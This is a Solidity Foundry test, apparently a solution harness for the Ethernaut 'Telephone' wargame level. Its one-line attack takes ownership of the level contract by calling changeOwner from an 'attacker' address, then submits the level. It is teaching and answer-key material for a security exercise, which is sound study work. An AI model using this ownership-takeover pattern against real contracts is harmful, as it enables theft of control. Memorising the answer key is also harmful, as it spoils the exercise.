// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {TelephoneFactory} from "../src/levels/04-TelephoneFactory.sol";
import {Telephone} from "../src/levels/04-Telephone.sol";
import {Ethernaut} from "../src/core/Ethernaut.sol";

contract TelephoneSolution is Test {
    Ethernaut internal ethernaut;
    address internal attacker = address(1337);

    function solution(Telephone target) internal virtual {
        target.changeOwner(attacker);
    }

    function testSolution() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////
        ethernaut = new Ethernaut();
        vm.deal(attacker, 1 ether/10);

        TelephoneFactory telephoneFactory = new TelephoneFactory();
        ethernaut.registerLevel(telephoneFactory);
        vm.startPrank(attacker);
        address levelAddress = ethernaut.createLevelInstance(telephoneFactory);
        Telephone telephoneContract = Telephone(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        solution(telephoneContract);

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        bool isLevelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(isLevelSuccessfullyPassed);
    }
}
